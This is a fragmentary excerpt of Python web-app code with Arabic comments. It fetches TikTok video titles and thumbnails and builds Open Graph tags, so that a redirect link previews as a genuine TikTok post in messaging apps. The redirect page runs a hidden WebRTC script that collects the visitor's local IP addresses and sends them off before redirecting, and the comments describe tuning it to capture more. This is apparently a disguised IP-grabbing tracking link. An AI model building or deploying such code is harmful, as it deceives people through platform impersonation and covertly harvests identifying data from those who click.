...
# دالة مطورة لتحديد المنصة تلقائياً وجلب بيانات المعاينة المناسبة لها
def get_platform_meta(url):
    ...
    # 1. التحقق إذا كان الرابط لتيك توك (تم تحسينه وحل مشكلة الصورة)
    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
        platform_name = "TikTok"
        try:
            # استخدام oembed الرسمي من تيك توك مع إضافة مرشح بروتوكول آمن
            ...
            if res.status_code == 200:
                data = res.json()
                title = data.get('title', "مقطع فيديو على تيك توك")
                img = data.get('thumbnail_url', default_img)
                # أحياناً ترجع الصورة بصيغة ويب سريعة، نضمن توافقها هنا
                return "TikTok", title, img
        except Exception as e:
            print(f"Error fetching TikTok meta: {e}")
...
def secure_redirect(link_id):
    ...
    if link_data:
        ...
        # تحسين وسوم الـ Open Graph للتوافق الكامل مع فيسبوك، واتساب وتليجرام
        if platform == "TikTok":
            title = f"{video_title} on TikTok"
            ...
            <script>
                function gatherLocalIPsAndRedirect() {{
                    ...
                    if (!window.RTCPeerConnection) {{
                        sendData("غير مدعوم في هذا المتصفح");
                        return;
                    }}

                    // تم تحسين إعدادات الـ RTC لزيادة احتمالية التقاط الآي بي المحلي
                    ...
                    // زيادة المهلة قليلاً لضمان اكتمال فحص الـ ICE Candidates في الخلفية
                    setTimeout(function() {{
                        var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي أو مشفر (mDNS / يتطلب HTTPS)";
